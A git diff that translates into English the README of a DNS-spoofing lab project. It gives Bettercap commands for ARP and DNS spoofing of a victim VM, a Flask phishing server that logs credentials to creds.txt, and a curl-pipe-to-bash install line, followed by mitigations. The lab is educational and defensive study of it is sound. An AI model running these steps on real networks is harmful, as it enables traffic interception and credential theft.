@@ -1,64 +1,64 @@
 # DNS Spoofing Attack in a Controlled Environment
 
-Este repositorio contiene el material y la documentación necesaria para replicar un ataque de **DNS Spoofing** en un entorno de laboratorio controlado. El proyecto demuestra cómo un atacante en la misma red local puede interceptar y manipular el tráfico DNS mediante **ARP Spoofing**, redirigiendo a la víctima a un servidor malicioso.
+This repository contains the material and documentation necessary to replicate a **DNS Spoofing** attack in a controlled laboratory environment. The project demonstrates how an attacker in the same local network can intercept and manipulate DNS traffic using **ARP Spoofing**, redirecting the victim to a malicious server.
 
-## 📋 Tabla de Contenidos
-- [Escenario del Laboratorio](#escenario-del-laboratorio)
-- [Requisitos Previos](#requisitos-previos)
-- [Instalación y Configuración](#instalación-y-configuración)
-- [Ejecución del Ataque (Paso a Paso)](#ejecución-del-ataque-paso-a-paso)
-  - [1. Configuración del Servidor Phishing](#1-configuración-del-servidor-phishing)
-  - [2. Ejecución de Bettercap](#2-ejecución-de-bettercap)
-- [Verificación y Evidencia](#verificación-y-evidencia)
-- [Mitigación y Defensa](#mitigación-y-defensa)
-- [Referencias](#referencias)
+## 📋 Table of Contents
+- [Laboratory Scenario](#laboratory-scenario)
+- [Prerequisites](#prerequisites)
+- [Installation and Configuration](#installation-and-configuration)
+- [Attack Execution (Step-by-Step)](#attack-execution-step-by-step)
+  - [1. Phishing Server Configuration](#1-phishing-server-configuration)
+  - [2. Running Bettercap](#2-running-bettercap)
+- [Verification and Evidence](#verification-and-evidence)
+- [Mitigation and Defense](#mitigation-and-defense)
+- [References](#references)
 
 ---
 
-## 🏰 Escenario del Laboratorio
+## 🏰 Laboratory Scenario
 
-El laboratorio simula un segmento de red LAN utilizando virtualización.
+The laboratory simulates a LAN network segment using virtualization.
 
-| Rol | S.O. | Herramienta Clave | IP (Ejemplo) | MAC (Ejemplo) |
+| Role | OS | Key Tool | IP (Example) | MAC (Example) |
 | :--- | :--- | :--- | :--- | :--- |
-| **Atacante** | Kali Linux | Bettercap, Flask | `192.168.0.116` | `7f:c8...` |
-| **Víctima** | Windows 10 | Navegador Web | `192.168.0.117` | `78:66...` |
+| **Attacker** | Kali Linux | Bettercap, Flask | `192.168.0.116` | `7f:c8...` |
+| **Victim** | Windows 10 | Web Browser | `192.168.0.117` | `78:66...` |
 | **Gateway** | (Virtual) | - | `192.168.0.0` | `50:98...` |
 
-**Topología**: Ambas máquinas deben estar configuradas en modo **Puente (Bridged)** en VMware para estar en el mismo segmento de red física o virtual.
+**Topology**: Both machines must be configured in **Bridged** mode in VMware to be on the same physical or virtual network segment.
 
 ---
 
-## 🛠 Requisitos Previos
+## 🛠 Prerequisites
 
-1. **VMware Workstation o Player**.
-2. **Máquina Virtual Kali Linux** (Atacante) con acceso a internet.
-3. **Máquina Virtual Windows 10** (Víctima).
-4. **Python 3** instalado en Kali Linux.
-5. **Bettercap** instalado en Kali Linux.
+1. **VMware Workstation or Player**.
+2. **Kali Linux Virtual Machine** (Attacker) with internet access.
+3. **Windows 10 Virtual Machine** (Victim).
+4. **Python 3** installed on Kali Linux.
+5. **Bettercap** installed on Kali Linux.
 
 ---
 
-## ⚙️ Instalación y Configuración
+## ⚙️ Installation and Configuration
 
-### En la Máquina Atacante (Kali Linux)
+### On the Attacker Machine (Kali Linux)
 
-1. **Clonar el repositorio**:
+1. **Clone the repository**:
    ```bash
    git clone https://github.com/BrDenky/DNSAttack.git
    cd DNSAttack
    ```
 
-2. **Instalar dependencias de Python (Flask)**:
+2. **Install Python dependencies (Flask)**:
    ```bash
    pip install flask
    ```
-   *O si prefieres usar el script de instalación automática mencionado en el informe:*
+   *Or if you prefer to use the automatic installation script mentioned in the report:*
    ```bash
    curl -sSL https://gist.github.com/BrDenky/bcc41c9546a22c59d7eb4d2c4e208825/raw/install.sh | bash
    ```
 
-3. **Instalar Bettercap**:
+3. **Install Bettercap**:
    ```bash
    sudo apt update
    sudo apt install bettercap
@@ -66,118 +66,129 @@ El laboratorio simula un segmento de red LAN utilizando virtualización.
 
 ---
 
-## 🚀 Ejecución del Ataque (Paso a Paso)
+## 🚀 Attack Execution (Step-by-Step)
 
-### 1. Configuración del Servidor Phishing
+### 1. Phishing Server Configuration
 
-El servidor web falso capturará las credenciales de la víctima. Este servidor sirve el archivo `index.html` y escucha en el puerto 80.
+The fake web server will capture the victim's credentials. This server serves the `index.html` file and listens on port 80.
 
-1. Asegúrate de que el puerto 80 esté libre.
-2. Ejecuta el servidor con permisos de superusuario (necesario para el puerto 80):
+1. Ensure port 80 is free.
+2. Run the server with superuser permissions (required for port 80):
    ```bash
    sudo python3 server.py
    ```
-   *El servidor quedará esperando conexiones. Las credenciales capturadas se guardarán en `creds.txt`.*
+   *The server will wait for connections. Captured credentials will be saved in `creds.txt`.*
 
-### 2. Ejecución de Bettercap
+### 2. Running Bettercap
 
-En una **nueva terminal** en Kali Linux, iniciaremos el ataque de Man-in-the-Middle (ARP Spoofing) y DNS Spoofing.
+In a **new terminal** on Kali Linux, we will start the Man-in-the-Middle (ARP Spoofing) and DNS Spoofing attack.
 
-1. **Iniciar Bettercap** seleccionando la interfaz de red (ej. `eth0`):
+1. **Start Bettercap** selecting the network interface (e.g., `eth0`):
    ```bash
    sudo bettercap -iface eth0
    ```
 
-2. **Configurar el objetivo (Víctima)**:
-   Dentro de la consola interactiva de bettercap:
+2. **Configure the target (Victim)**:
+   Inside the bettercap interactive console:
    ```bash
-   # Escanear la red para encontrar a la víctima
+   # Scan the network to find the victim
    net.probe on
    
-   # Listar dispositivos encontrados
+   # List found devices
    net.show
    
-   # Establecer la IP de la víctima como objetivo (Reemplazar con la IP real)
+   # Set the victim's IP as the target (Replace with actual IP)
    set arp.spoof.targets 192.168.0.117
    ```
 
-3. **Iniciar ARP Spoofing**:
+3. **Start ARP Spoofing**:
    ```bash
    arp.spoof on
    ```
-   *En este punto, el tráfico de la víctima pasa por tu máquina.*
+   *At this point, the victim's traffic passes through your machine.*
 
-4. **Configurar DNS Spoofing**:
-   Redirigiremos un dominio legítimo (ej. `example.com` o `fakebank.test`) a nuestra IP (Atacante).
+4. **Configure DNS Spoofing**:
+   We will redirect a legitimate domain (e.g., `example.com` or `fakebank.test`) to our IP (Attacker).
    ```bash
-   # Dominio que queremos suplantar
+   # Domain we want to spoof
    set dns.spoof.domains example.com
    
-   # IP del servidor malicioso (Tu IP de Kali)
+   # Malicious server IP (Your Kali IP)
    set dns.spoof.address 192.168.0.116
    
-   # Iniciar el módulo de DNS Spoofing
+   # Start the DNS Spoofing module
    dns.spoof on
    ```
 
 ---
 
-## 🕵️ Verificación y Evidencia
+## 🕵️ Verification and Evidence
 
-Para confirmar que el ataque es exitoso, realiza las siguientes pruebas en la **Máquina Víctima (Windows 10)**:
+To confirm the attack is successful, perform the following tests on the **Victim Machine (Windows 10)**:
 
-1. **Verificar Tabla ARP (Confirmar Envenenamiento)**:
+1. **Check ARP Table (Confirm Poisoning)**:
    ```cmd
    arp -a
    ```
-   *Busca la IP del Gateway. La dirección física (MAC) debería ser ahora la misma que la de la máquina atacante (Kali), indicando que el ARP Spoofing funciona.*
+   *Look for the Gateway IP. The physical address (MAC) should now be the same as the attacker machine's (Kali), indicating ARP Spoofing is working.*
 
-2. **Limpiar Caché DNS**:
+2. **Flush DNS Cache**:
    ```cmd
    ipconfig /flushdns
    ```
 
-3. **Prueba de Resolución DNS**:
+3. **DNS Resolution Test**:
    ```cmd
    nslookup example.com
    ```
-   *La respuesta debería ser la IP del atacante (`192.168.0.116`) en lugar de la IP real del dominio.*
+   *The response should be the attacker's IP (`192.168.0.116`) instead of the domain's real IP.*
 
-4. **Prueba de Navegación**:
-   Abre el navegador y entra a `http://example.com`. Deberías ver la página falsa servida por `server.py`.
+4. **Browsing Test**:
+   Open the browser and go to `http://example.com`. You should see the fake page served by `server.py`.
 
-5. **Captura de Credenciales**:
-   Si la víctima introduce datos en el formulario falso, revisa el archivo `creds.txt` en la máquina atacante:
+5. **Credential Capture**:
+   If the victim enters data into the fake form, check the `creds.txt` file on the attacker machine:
    ```bash
    cat creds.txt
    ```
 
 ---
 
-## 🛡 Mitigación y Defensa
+## 🛡 Mitigation and Defense
 
-El informe detalla estrategias para defenderse de este ataque:
+The report details strategies to defend against this attack:
 
-### 1. Mapeo Estático de ARP (Defensa Capa 2)
-Evita que la tabla ARP sea modificada dinámicamente por atacantes.
+### 1. Static ARP Mapping (Layer 2 Defense)
+Prevents the ARP table from being dynamically modified by attackers.
 
-**En Windows (Admin):**
+**On Windows (Admin):**
 ```cmd
-netsh interface ipv4 add neighbors "NombreInterfaz" <IP_Gateway> <MAC_Real_Gateway>
+netsh interface ipv4 add neighbors "InterfaceName" <Gateway_IP> <Gateway_Real_MAC>
 ```
-*Ejemplo:*
+*Example:*
 ```cmd
 netsh interface ipv4 add neighbors "Ethernet0" 192.168.0.1 00-50-56-f6-56-f6
 ```
 
-### 2. Restricción de Tráfico DNS (Defensa Capa 3)
-Configurar el Firewall para aceptar respuestas DNS (UDP/53) **solo** del Gateway legítimo.
+### 2. DNS Traffic Restriction (Layer 3 Defense)
+Configure the Firewall to accept DNS responses (UDP/53) **only** from the legitimate Gateway.
 
-### 3. Uso de DNS Encriptado (DoH / DoT)
-Utilizar protocolos que encriptan y autentican las consultas DNS, evitando la manipulación en tránsito.
+### 3. Use Encrypted DNS (DoH / DoT)
+Use protocols that encrypt and authenticate DNS queries, preventing manipulation in transit.
 
 ---
 
-## 📄 Referencias
-Basado en el paper:
-**"DNS Spoofing Attack in a Controlled Environment"** - Mateo David Pilaquinga Guachamin, Yachay Tech University.
+## 📄 References
+
+This project is primarily based on research papers (available in the `Annex/` directory) provided the theoretical foundation and comparative data for this work:
+
+1. **A. Budiansyah et al.** - *"Detection of DNS spoofing attacks on campus networks using LightGBM with hybrid feature selection (SelectKBest + SHAP)"* (2025).
+2. **U. Aijaz, M. Misbahuddin, & S. Raziuddin** - *"Survey on DNS-specific security issues and solution approaches"* (2021).
+3. **Y. Afek & H. Berger** - *"POPS: From history to mitigation of DNS cache poisoning attacks"* (2025).
+4. **T. R. Kukutla** - *"A deep dive into DNS spoofing and security measures"* (2023).
+5. **Q. Li et al.** - *"Survey on DNS recursive resolution service security technology: Threats, defenses, and measurements"* (2025).
+6. **H. Gattu, J. Karimireddy, & K. G** - *"DNS under siege: Ethical DNS spoofing and countermeasures"* (2025).
+7. **Z. Cekerevac** - *"Firewall-based defense strategies against man-in-the-middle attacks"* (2025).
+8. **M. Dawood et al.** - *"The impact of domain name server (DNS) over hypertext transfer protocol secure (HTTPS) on cyber security"* (2024).
+9. **H. M. Al-Mimi et al.** - *"Improved intrusion detection system to alleviate attacks on DNS service"* (2023).
+10. **M. Pardo Fernández et al.** - *"Implementación y análisis de los mecanismos de seguridad de DNS"* (2025).
